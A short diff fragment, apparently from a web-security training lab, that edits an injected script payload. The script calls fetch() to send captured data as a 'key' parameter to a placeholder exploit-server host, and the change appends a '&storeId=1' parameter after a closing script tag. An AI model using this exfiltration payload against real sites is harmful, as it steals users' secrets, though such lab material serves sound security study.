@@ -11,5 +11,5 @@
             fetch('https://exploit-YOUR-EXPLOIT-ID.exploit-server.net/exploit?key=' + encodeURIComponent(data));
         })
     </script>
-"</script>
+&storeId=1"</script>
 
